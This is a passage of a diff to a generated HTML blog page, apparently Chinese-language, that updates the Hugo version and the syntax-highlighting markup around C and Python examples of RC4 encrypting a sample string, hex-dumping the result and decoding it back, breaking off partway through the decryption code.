@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.92.0" /><meta name="theme-color" content="#16171d" />
+    <meta name="generator" content="Hugo 0.94.2" /><meta name="theme-color" content="#16171d" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.883a355335df5c9f19d469cd25bb68215497fd354fb3a8699eaf851799c161a8.js"></script>
+        <script src="/js/meme.min.aa6eafedce46ed74b4ce8a5ccd665b53678dd707d3ba5339679e4b4dda556062.js"></script>
 
     
 
@@ -321,59 +321,59 @@
 </span><span class="lnt">52
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span><span class="cp"></span><span class="n">VOID</span> <span class="nf">RC4Init</span><span class="p">(</span><span class="n">BYTE</span><span class="o">*</span> <span class="n">s</span><span class="p">,</span> <span class="n">CHAR</span><span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="n">INT</span> <span class="n">Len</span><span class="p">)</span>
-<span class="p">{</span>
-	<span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-	<span class="n">BYTE</span> <span class="n">k</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
-	<span class="n">BYTE</span> <span class="n">tmp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-	<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
-	<span class="p">{</span>
-		<span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
-		<span class="n">k</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">Len</span><span class="p">];</span>
-	<span class="p">}</span>
-	<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
-	<span class="p">{</span>
-		<span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">k</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
-		<span class="n">tmp</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
-		<span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
-		<span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span>
-	<span class="p">}</span>
-<span class="p">}</span>
-<span class="n">VOID</span> <span class="nf">RC4Encrypt</span><span class="p">(</span><span class="n">BYTE</span><span class="o">*</span> <span class="n">s</span><span class="p">,</span> <span class="n">CHAR</span><span class="o">*</span> <span class="n">Data</span><span class="p">,</span> <span class="n">INT</span> <span class="n">Len</span><span class="p">)</span>
-<span class="p">{</span>
-	<span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">t</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-	<span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-	<span class="n">BYTE</span> <span class="n">tmp</span><span class="p">;</span>
-	<span class="k">for</span> <span class="p">(</span><span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">Len</span><span class="p">;</span> <span class="n">k</span><span class="o">++</span><span class="p">)</span>
-	<span class="p">{</span>
-		<span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
-		<span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
-		<span class="n">tmp</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
-		<span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
-		<span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span>
-		<span class="n">t</span> <span class="o">=</span> <span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
-		<span class="n">Data</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">^=</span> <span class="n">s</span><span class="p">[</span><span class="n">t</span><span class="p">];</span>
-	<span class="p">}</span>
-<span class="p">}</span>
-<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-	<span class="c1">//需要加密的数据
-</span><span class="c1"></span>	<span class="n">CHAR</span> <span class="n">data</span><span class="p">[]</span><span class="o">=</span><span class="s">&#34;you are kidding me&#34;</span><span class="p">;</span> 
-	<span class="c1">//加密密钥
-</span><span class="c1"></span>	<span class="n">CHAR</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;DsbNrQ01WT9Py5RkPT8P&#34;</span><span class="p">;</span>
-	<span class="n">BYTE</span> <span class="n">s</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
-	<span class="c1">//初始化数组
-</span><span class="c1"></span>	<span class="n">RC4Init</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
-	<span class="c1">//加密
-</span><span class="c1"></span>	<span class="n">RC4Encrypt</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="n">data</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">data</span><span class="p">));</span>
-	<span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;1.txt&#34;</span><span class="p">,</span><span class="n">GENERIC_WRITE</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">CREATE_NEW</span><span class="p">,</span><span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
-	<span class="k">if</span> <span class="p">(</span><span class="n">hFile</span> <span class="o">!=</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
-	<span class="p">{</span>
-		<span class="n">WriteFile</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span><span class="n">data</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">data</span><span class="p">),</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
-	<span class="p">}</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">VOID</span> <span class="nf">RC4Init</span><span class="p">(</span><span class="n">BYTE</span><span class="o">*</span> <span class="n">s</span><span class="p">,</span> <span class="n">CHAR</span><span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="n">INT</span> <span class="n">Len</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">BYTE</span> <span class="n">k</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">	<span class="n">BYTE</span> <span class="n">tmp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">k</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">Len</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">k</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">tmp</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">VOID</span> <span class="nf">RC4Encrypt</span><span class="p">(</span><span class="n">BYTE</span><span class="o">*</span> <span class="n">s</span><span class="p">,</span> <span class="n">CHAR</span><span class="o">*</span> <span class="n">Data</span><span class="p">,</span> <span class="n">INT</span> <span class="n">Len</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">t</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">BYTE</span> <span class="n">tmp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">Len</span><span class="p">;</span> <span class="n">k</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">tmp</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">t</span> <span class="o">=</span> <span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">Data</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">^=</span> <span class="n">s</span><span class="p">[</span><span class="n">t</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//需要加密的数据
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">CHAR</span> <span class="n">data</span><span class="p">[]</span><span class="o">=</span><span class="s">&#34;you are kidding me&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">	<span class="c1">//加密密钥
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">CHAR</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;DsbNrQ01WT9Py5RkPT8P&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">BYTE</span> <span class="n">s</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//初始化数组
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">RC4Init</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">key</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">//加密
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="n">RC4Encrypt</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="n">data</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">data</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;1.txt&#34;</span><span class="p">,</span><span class="n">GENERIC_WRITE</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">CREATE_NEW</span><span class="p">,</span><span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">hFile</span> <span class="o">!=</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">WriteFile</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span><span class="n">data</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">data</span><span class="p">),</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>结果
 <img src="/images/image-20220112232339.png" alt="">
@@ -387,9 +387,9 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">binascii</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">binascii</span><span class="o">.</span><span class="n">b2a_hex</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s2">&#34;1.txt&#34;</span><span class="p">,</span><span class="s2">&#34;rb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()))</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">binascii</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">binascii</span><span class="o">.</span><span class="n">b2a_hex</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s2">&#34;1.txt&#34;</span><span class="p">,</span><span class="s2">&#34;rb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()))</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>得到结果: <code>eef725647574cc48fa4dd3f927932e70b152</code></p>
 <p>下面对该字符串每一位进行处理还原</p>
@@ -417,27 +417,27 @@
 </span><span class="lnt">20
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">VOID</span> <span class="nf">StrToByte</span><span class="p">(</span><span class="n">CHAR</span><span class="o">*</span> <span class="n">Result</span><span class="p">,</span> <span class="n">CHAR</span><span class="o">*</span> <span class="n">Src</span><span class="p">,</span> <span class="n">INT</span> <span class="n">nLen</span><span class="p">)</span>
-<span class="p">{</span>
-	<span class="n">CHAR</span> <span class="n">h1</span><span class="p">,</span> <span class="n">h2</span><span class="p">;</span>
-	<span class="n">CHAR</span> <span class="n">s1</span><span class="p">,</span> <span class="n">s2</span><span class="p">;</span>
-	<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
-	<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">nLen</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
-	<span class="p">{</span>
-		<span class="n">h1</span> <span class="o">=</span> <span class="n">Src</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">i</span><span class="p">];</span>
-		<span class="n">h2</span> <span class="o">=</span> <span class="n">Src</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
-		<span class="n">s1</span> <span class="o">=</span> <span class="n">toupper</span><span class="p">(</span><span class="n">h1</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x30</span><span class="p">;</span>
-		<span class="k">if</span> <span class="p">(</span><span class="n">s1</span> <span class="o">&gt;</span> <span class="mi">9</span><span class="p">)</span>
-			<span class="n">s1</span> <span class="o">-=</span> <span class="mi">7</span><span class="p">;</span>
-
-		<span class="n">s2</span> <span class="o">=</span> <span class="n">toupper</span><span class="p">(</span><span class="n">h2</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x30</span><span class="p">;</span>
-		<span class="k">if</span> <span class="p">(</span><span class="n">s2</span> <span class="o">&gt;</span> <span class="mi">9</span><span class="p">)</span>
-			<span class="n">s2</span> <span class="o">-=</span> <span class="mi">7</span><span class="p">;</span>
-
-		<span class="n">Result</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">s1</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="n">s2</span><span class="p">;</span>
-	<span class="p">}</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">VOID</span> <span class="nf">StrToByte</span><span class="p">(</span><span class="n">CHAR</span><span class="o">*</span> <span class="n">Result</span><span class="p">,</span> <span class="n">CHAR</span><span class="o">*</span> <span class="n">Src</span><span class="p">,</span> <span class="n">INT</span> <span class="n">nLen</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">CHAR</span> <span class="n">h1</span><span class="p">,</span> <span class="n">h2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">CHAR</span> <span class="n">s1</span><span class="p">,</span> <span class="n">s2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">nLen</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">h1</span> <span class="o">=</span> <span class="n">Src</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="n">h2</span> <span class="o">=</span> <span class="n">Src</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="n">s1</span> <span class="o">=</span> <span class="n">toupper</span><span class="p">(</span><span class="n">h1</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x30</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">s1</span> <span class="o">&gt;</span> <span class="mi">9</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="n">s1</span> <span class="o">-=</span> <span class="mi">7</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="n">s2</span> <span class="o">=</span> <span class="n">toupper</span><span class="p">(</span><span class="n">h2</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x30</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">s2</span> <span class="o">&gt;</span> <span class="mi">9</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="n">s2</span> <span class="o">-=</span> <span class="mi">7</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="n">Result</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">s1</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="n">s2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>完整解密代码</p>
 <div class="highlight"><div class="chroma">
@@ -515,78 +515,78 @@
 </span><span class="lnt">71
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span><span class="cp"></span><span class="n">VOID</span> <span class="nf">RC4Init</span><span class="p">(</span><span class="n">BYTE</span><span class="o">*</span> <span class="n">s</span><span class="p">,</span> <span class="n">CHAR</span><span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="n">INT</span> <span class="n">Len</span><span class="p">)</span>
-<span class="p">{</span>
-	<span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-	<span class="n">BYTE</span> <span class="n">k</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
-	<span class="n">BYTE</span> <span class="n">tmp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-	<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
-	<span class="p">{</span>
-		<span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
-		<span class="n">k</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">Len</span><span class="p">];</span>
-	<span class="p">}</span>
-	<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
-	<span class="p">{</span>
-		<span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">k</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
-		<span class="n">tmp</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
-		<span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
-		<span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span>
-	<span class="p">}</span>
-<span class="p">}</span>
-<span class="n">VOID</span> <span class="nf">RC4Encrypt</span><span class="p">(</span><span class="n">BYTE</span><span class="o">*</span> <span class="n">s</span><span class="p">,</span> <span class="n">CHAR</span><span class="o">*</span> <span class="n">Data</span><span class="p">,</span> <span class="n">INT</span> <span class="n">Len</span><span class="p">)</span>
-<span class="p">{</span>
-	<span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">t</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-	<span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-	<span class="n">BYTE</span> <span class="n">tmp</span><span class="p">;</span>
-	<span class="k">for</span> <span class="p">(</span><span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">Len</span><span class="p">;</span> <span class="n">k</span><span class="o">++</span><span class="p">)</span>
-	<span class="p">{</span>
-		<span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
-		<span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
-		<span class="n">tmp</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
-		<span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
